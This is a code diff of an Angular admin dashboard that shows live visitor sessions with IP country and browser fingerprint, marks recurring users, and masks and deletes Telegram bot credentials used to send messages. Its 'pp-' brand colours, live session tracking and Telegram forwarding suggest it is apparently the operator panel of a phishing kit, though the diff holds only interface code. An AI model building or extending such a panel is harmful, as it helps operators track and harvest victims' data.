@@ -84,7 +84,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       </aside>
 
       <!-- MAIN CONTENT -->
-      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg overflow-hidden">
+      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg dark:bg-slate-900 overflow-hidden">
          
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
@@ -97,9 +97,6 @@ type AdminTab = 'live' | 'history' | 'settings';
                  }
              </div>
              <div class="flex items-center gap-4">
-                 <button (click)="refresh()" class="p-2 text-pp-blue bg-blue-50 rounded-full hover:bg-blue-100 transition-colors" title="Force Refresh">
-                     <span class="material-icons text-sm">refresh</span>
-                 </button>
                  <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs">A</div>
              </div>
          </header>
@@ -117,7 +114,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                         <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy dark:text-white">Active Sessions</h3>
-                                 <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
+                                 <div class="flex items-center gap-2">
+                                     <button (click)="refresh()" class="p-1.5 text-pp-blue bg-blue-50 dark:bg-blue-900/30 rounded-lg hover:bg-blue-100 dark:hover:bg-blue-900/50 transition-colors" title="Refresh">
+                                         <span class="material-icons text-sm">refresh</span>
+                                     </button>
+                                     <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
+                                 </div>
                              </div>
                              <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
                                  @for(session of state.activeSessions(); track session.id) {
@@ -137,6 +139,9 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                 <span class="font-bold text-pp-navy dark:text-white font-mono text-xs">{{ session.id }}</span>
                                                 @if(session.data?.ipCountry) {
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
+                                                }
+                                                @if(session.data?.isRecurring) {
+                                                    <span class="material-icons text-[12px] text-amber-600 bg-amber-100 rounded-full p-0.5" title="Recurring User">history</span>
                                                 }
                                              </div>
                                              <div class="flex items-center justify-between w-full">
@@ -474,7 +479,7 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                         <div class="flex-1 overflow-auto bg-white dark:bg-slate-800">
                             <table class="w-full text-left border-collapse">
-                                <thead class="bg-pp-bg dark:bg-slate-900 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
+                                <thead class="bg-pp-bg dark:bg-slate-800 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                     <tr>
                                         <th class="px-4 py-4 w-12 text-center">
                                             <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
@@ -574,21 +579,51 @@ type AdminTab = 'live' | 'history' | 'settings';
                          <!-- Telegram -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Telegram Integration</h3>
-                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                <div class="pp-input-group mb-0">
-                                    <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Bot Token</label>
-                                </div>
-                                <div class="pp-input-group mb-0">
-                                    <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Chat ID</label>
-                                </div>
-                             </div>
-                             <div class="mt-4">
-                                 <button (click)="saveSettings()" class="pp-btn">
-                                     Save API Settings
-                                 </button>
-                             </div>
+
+                             @if(!isSettingsConfigured()) {
+                                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="pp-input-group mb-0">
+                                        <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Bot Token</label>
+                                    </div>
+                                    <div class="pp-input-group mb-0">
+                                        <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Chat ID</label>
+                                    </div>
+                                 </div>
+                                 <div class="mt-4">
+                                     <button (click)="saveSettings()" class="pp-btn">
+                                         Save API Settings
+                                     </button>
+                                 </div>
+                             } @else {
+                                 <div class="bg-slate-50 dark:bg-slate-700/50 p-6 rounded-xl border border-slate-200 dark:border-slate-600">
+                                     <div class="flex items-center gap-4 mb-4">
+                                         <div class="w-12 h-12 rounded-full bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center text-pp-blue">
+                                             <span class="material-icons">telegram</span>
+                                         </div>
+                                         <div>
+                                             <h4 class="font-bold text-pp-navy dark:text-white">Bot Configured</h4>
+                                             <p class="text-xs text-slate-500 dark:text-slate-400">Messages will be sent to this channel.</p>
+                                         </div>
+                                     </div>
+
+                                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                                         <div class="bg-white dark:bg-slate-800 p-3 rounded-lg border border-slate-200 dark:border-slate-600">
+                                             <p class="text-[10px] uppercase font-bold text-slate-400 mb-1">Bot Token</p>
+                                             <p class="font-mono font-bold text-sm text-pp-navy dark:text-white">{{ maskedToken() }}</p>
+                                         </div>
+                                         <div class="bg-white dark:bg-slate-800 p-3 rounded-lg border border-slate-200 dark:border-slate-600">
+                                             <p class="text-[10px] uppercase font-bold text-slate-400 mb-1">Chat ID</p>
+                                             <p class="font-mono font-bold text-sm text-pp-navy dark:text-white">{{ maskedChat() }}</p>
+                                         </div>
+                                     </div>
+
+                                     <button (click)="deleteSettings()" class="flex items-center justify-center gap-2 w-full py-3 rounded-lg font-bold text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 transition-colors border border-transparent hover:border-red-100">
+                                         <span class="material-icons text-sm">delete</span> Remove Credentials
+                                     </button>
+                                 </div>
+                             }
                          </div>
 
                          <!-- Security -->
@@ -956,6 +991,24 @@ export class AdminDashboardComponent {
   tgToken = '';
   tgChat = '';
 
+  isSettingsConfigured = computed(() => {
+      const t = this.state.telegramBotToken();
+      const c = this.state.telegramChatId();
+      return !!(t && c && t.length > 5 && c.length > 3);
+  });
+
+  maskedToken = computed(() => {
+      const t = this.state.telegramBotToken();
+      if (!t || t.length < 8) return '********';
+      return `${t.substring(0, 3)}...${t.substring(t.length - 5)}`;
+  });
+
+  maskedChat = computed(() => {
+      const c = this.state.telegramChatId();
+      if (!c || c.length < 5) return '***';
+      return `${c.substring(0, 2)}...${c.substring(c.length - 3)}`;
+  });
+
   // Security
   settingOldPass = '';
   settingNewPass = '';
@@ -1268,6 +1321,15 @@ ${session.fingerprint?.userAgent}
       // Email feature removed (pass empty string)
       this.state.updateAdminSettings('', true, this.tgToken, this.tgChat);
       this.state.showAdminToast('Settings Saved');
+  }
+
+  deleteSettings() {
+      if(confirm('Are you sure you want to remove the Telegram credentials?')) {
+          this.state.updateAdminSettings('', true, '', '');
+          this.tgToken = '';
+          this.tgChat = '';
+          this.state.showAdminToast('Credentials Removed');
+      }
   }
 
   async changePassword() {
